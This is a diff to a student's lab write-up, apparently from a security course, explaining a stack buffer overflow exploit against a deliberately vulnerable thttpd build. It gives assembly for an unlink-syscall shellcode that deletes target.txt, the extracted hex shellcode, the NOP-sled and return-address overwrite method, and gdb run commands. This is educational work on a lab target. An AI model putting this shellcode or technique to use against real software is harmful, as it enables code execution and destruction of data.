@@ -447,8 +447,82 @@ to many jump statements as shown above. So even if the stack is not being messed
 with, the address sanitizer may cause a crash if a pointer points to an invalid
 address.
 
-Next I needed to build an exploit to cause thttpd-no to delete target.txt when invoked with
-a given config file. I will overwrite the return address of read_config to point
-to a location on the stack where the line array was. Because the line array has
-the contents of the config file, I will load bytecode in the config file and
-then the program will execute it.
+11. How is your exploit built? (10 points)
+
+Next I needed to build an exploit to cause thttpd-no to delete target.txt when
+invoked with a given config file. I will overwrite the return address of
+read_config to point to a location on the stack where the line array
+was. Because the line array has the contents of the config file, I will load
+shellcode in the config file and then the program will execute it. I will delete
+the file with the unlink system call. It is the system call number 87 or 0x57 on
+a 64 bit machine. So I write an assembly file with the following contents
+
+        .file   "test.c"
+        .section        .text.startup,"ax",@progbits
+        .p2align 4,,15
+        .globl  main
+        .type   main, @function
+main:
+.LFB0:
+        .cfi_startproc
+        push $0x57
+        pop %rax
+        movabsq $0x7478,%rbx
+        push %rbx
+        movabsq $0x742e746567726174,%rbx
+        push %rbx
+        movq %rsp, %rdi
+        syscall
+        ret
+        .cfi_endproc
+.LFE0:
+        .size   main, .-main
+        .ident  "GCC: (GNU) 6.3.0"
+        .section        .note.GNU-stack,"",@progbits
+
+This will put 0x57 in rax, "target.txt" on the stack, and a pointer to
+"target.txt" as the first argument to the syscall. When syscall happens, it
+calls unlink on target.txt. I compiled the code into an executable a.out then
+did
+
+objdump -d a.out
+
+to extract the hex values of main. The shellcode I got for the relevant
+instructions was
+
+  4003d0:       6a 57                   pushq  $0x57
+  4003d2:       58                      pop    %rax
+  4003d3:       48 bb 78 74 00 00 00    movabs $0x7478,%rbx
+  4003da:       00 00 00
+  4003dd:       53                      push   %rbx
+  4003de:       48 bb 74 61 72 67 65    movabs $0x742e746567726174,%rbx
+  4003e5:       74 2e 74
+  4003e8:       53                      push   %rbx
+  4003e9:       48 89 e7                mov    %rsp,%rdi
+  4003ec:       0f 05                   syscall
+
+which I made into the string
+
+6a575848bb78740000000000005348bb7461726765742e74534889e70f05
+
+Then using emacs's hexl-mode I made an exploit.txt that contained this
+shellcode, and in gdb I found out where it was stored in memory in the
+program. I made the last characters of exploit.txt overwrite the stored return
+address so that it would point before the beginning of this code. I made sure
+the first 5 characters of exploit.txt were "user=" so that it would be a valid
+config file. The remaining characters were nops, which had hex value 0x90. This
+made a nop sled. I made sure to leave 16 bytes between my shellcode and the
+stack pointer, because two values are pushed onto the stack for the
+syscall. This way none of my shell code gets overwritten. exploit.txt is
+included as an attached file. Running
+
+gdb src/thttpd-no
+(gdb) run -p 12843 -D -C exploit.txt
+
+causes a segfault and deletes target.txt. Running without gdb like so
+
+src/thttpd-no -p 12843 -D -C exploit.txt
+
+does not remove target.txt, because address space layout randomization is turned
+on. gdb turns it off which allows the exploit to have the same stack pointer
+every time, which makes the exploit work.
